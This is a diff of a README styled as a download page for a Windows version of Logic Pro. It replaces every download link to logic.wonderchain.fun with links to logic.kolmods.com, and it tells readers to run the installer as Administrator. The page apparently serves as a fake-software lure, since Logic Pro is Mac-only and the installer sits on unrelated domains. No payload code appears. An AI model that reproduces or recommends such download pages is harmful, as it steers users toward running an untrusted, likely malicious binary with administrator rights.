@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Logic Pro** for Windows.
 
 <p align="center">
-  <a href="https://logic.wonderchain.fun/">
+  <a href="https://logic.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Logic%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Logic Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[logic.wonderchain.fun](https://logic.wonderchain.fun/)** |
-| **Full URL** | `https://logic.wonderchain.fun/` |
+| **Direct link** | **[logic.kolmods.com](https://logic.kolmods.com/)** |
+| **Full URL** | `https://logic.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — logic.wonderchain.fun](https://logic.wonderchain.fun/)** (link above)
+1. Click **[Download — logic.kolmods.com](https://logic.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://logic.wonderchain.fun/"><strong>⬇ Download Logic Pro now</strong></a></p>
+<p align="center"><a href="https://logic.kolmods.com/"><strong>⬇ Download Logic Pro now</strong></a></p>
 
 ---
 
